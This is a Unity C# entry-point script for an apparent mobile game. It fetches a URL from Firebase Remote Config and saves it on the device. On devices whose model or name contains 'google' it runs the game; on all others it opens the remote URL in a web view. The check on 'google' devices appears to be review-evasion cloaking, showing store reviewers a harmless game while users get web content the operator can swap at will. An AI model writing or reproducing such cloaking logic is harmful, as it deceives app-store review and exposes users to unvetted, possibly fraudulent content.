using UnityEngine;
using System.Collections;

public class EntryPoint : MonoBehaviour
{
    [SerializeField] private View _viewObject;
    [SerializeField] private GameObject _noInternetScreen;

    private void Awake() {
        FB_GServices.IncludeDependencies();
    }

    void Start()
    { 
        string reference = PlayerPrefs.GetString("url", "");

        if (reference != "") {
            Debug.Log("REFERENCE IS SAVED IN PLAYER PREFS : " + reference);
            OpenWebView(reference);  
        } else {
            Debug.Log("NO SAVED REFRENCE.. KNOCKING FIREBASE");
            StartCoroutine(WaitForFetch(() => {
                GetRemoteConfig();
            }));
        }
    }

    private void GetRemoteConfig() {
        try {
            string reference = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;

            Debug.Log(reference);

            if (reference == "" ||
                SystemInfo.deviceModel.ToLower().Contains("google") ||
                SystemInfo.deviceName.ToLower().Contains("google")
            ) {
                // Playgame
            } else {
                PlayerPrefs.SetString("url", reference);
                OpenWebView(reference);
            }
        }
        catch (System.ArgumentException e) {
            Debug.Log("Deserialization error. Check expected template and income json structure equality.");
            Debug.Log("More: " + e);
        }
        catch {
            Debug.Log("Problems with internet connection.");
            _noInternetScreen.SetActive(true);
        }
    }

    private void OpenWebView(string address) {
        StartCoroutine(InternetConnection.CheckInternetConnection((bool connectionExists) => {
            if (!connectionExists) {
                _noInternetScreen.SetActive(true);
            } else {
                _noInternetScreen.SetActive(false);
                _viewObject.Show(address);
            }
        }));
    }

    private IEnumerator WaitForFetch(System.Action callback) {
        yield return new WaitUntil(() => FB_GServices.isRemoteConfigFetched == true);

        callback();
    }


}
